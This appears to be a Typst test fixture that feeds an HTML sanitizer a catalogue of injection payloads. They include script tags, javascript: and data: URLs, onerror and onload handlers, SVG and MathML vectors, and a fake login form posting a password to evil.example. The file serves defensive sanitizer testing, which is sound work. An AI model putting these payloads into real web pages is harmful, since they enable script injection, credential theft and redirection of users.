= Worksheet

// Elements that run script, load things, submit data or take over the page,
// written with `html.elem` (HTML target; paged export ignores them). The
// sanitizer removes them with their content.

#html.elem("script", "window.typstreamPwned = 'script'")
#html.elem("script", attrs: (src: "https://evil.example/x.js"))
#html.elem("style", "body { display: none } .typstream { background: url(https://evil.example/s.png) }")
#html.elem("link", attrs: (rel: "stylesheet", href: "https://evil.example/s.css"))
#html.elem("iframe", attrs: (srcdoc: "<script>parent.typstreamPwned = 'iframe'</script>"))
#html.elem("iframe", attrs: (src: "javascript:parent.typstreamPwned = 'iframe-src'"))
#html.elem("object", attrs: (data: "data:text/html,<script>alert(1)</script>"))
#html.elem("embed", attrs: (src: "data:text/html,<script>alert(1)</script>"))
#html.elem("base", attrs: (href: "https://evil.example/"))
#html.elem("meta", attrs: ("http-equiv": "refresh", content: "0; url=https://evil.example/"))
#html.elem("form", attrs: (action: "https://evil.example/collect"))[
  #html.elem("input", attrs: (name: "password", type: "password"))
  #html.elem("button", attrs: (formaction: "javascript:alert(1)"))[Log in]
]
#html.elem("template")[#html.elem("img", attrs: (src: "x", onerror: "window.typstreamPwned = 'template'"))]
#html.elem("noscript")[#html.elem("img", attrs: (src: "x", onerror: "window.typstreamPwned = 'noscript'"))]
#html.elem("dialog", attrs: (open: "open"))[Your session expired.]
#html.elem("textarea", "Type your password")
#html.elem("x-widget")[A custom element is unwrapped; its text stays.]
#html.elem("svg", attrs: (onload: "window.typstreamPwned = 'svg'"))[
  #html.elem("script", "window.typstreamPwned = 'svg-script'")
  #html.elem("foreignObject")[#html.elem("iframe", attrs: (srcdoc: "<script>parent.typstreamPwned = 'fo'</script>"))]
  #html.elem("animate", attrs: (attributeName: "href", values: "javascript:alert(1)"))
  #html.elem("set", attrs: (attributeName: "onmouseover", to: "alert(1)"))
  #html.elem("a", attrs: (href: "javascript:alert(1)"))[#html.elem("text")[svg link]]
  #html.elem("use", attrs: (href: "data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"))
]
#html.elem("math")[
  #html.elem("mi", attrs: (href: "javascript:alert(1)"))[x]
  #html.elem("semantics")[#html.elem("mtext")[#html.elem("img", attrs: (src: "x", onerror: "window.typstreamPwned = 'mathml'"))]]
]

The worksheet's text survives.
